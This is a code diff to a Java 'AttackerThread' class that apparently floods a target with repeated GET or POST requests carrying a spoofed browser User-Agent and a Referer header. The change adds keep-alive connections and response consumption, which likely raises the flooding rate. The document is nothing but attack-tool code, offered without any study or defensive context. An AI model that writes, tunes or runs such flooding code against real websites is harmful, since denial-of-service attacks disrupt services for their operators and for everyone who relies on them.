@@ -12,6 +12,7 @@ import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.message.BasicHeader;
+import org.apache.http.util.EntityUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -56,7 +57,7 @@ public class AttackerThread extends Thread {
 	}
 	List<Header> defaultHeaders = Arrays.asList(new BasicHeader("User-Agent",
 		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"),
-		new BasicHeader("Referer", this.referer));
+		new BasicHeader("Referer", this.referer), new BasicHeader("Connection", "keep-alive"));
 	logger.info("Using " + (method == POST ? "POST" : "GET" + " to attack ") + target);
 	logger.info(this.getName() + " started.");
 	CloseableHttpResponse httpResponse = null;
@@ -171,6 +172,14 @@ public class AttackerThread extends Thread {
 		MonitorThread.newError();
 		httpResponse = null;
 		continue;
+	    }
+	    try {
+		EntityUtils.consume(httpResponse.getEntity());
+	    } catch (Throwable e) {
+		if (showExceptions)
+		    logger.warn("Error while consuming entity", e);
+		else
+		    logger.warn("Error while consuming entity");
 	    }
 	}
 	httpResponse = null;
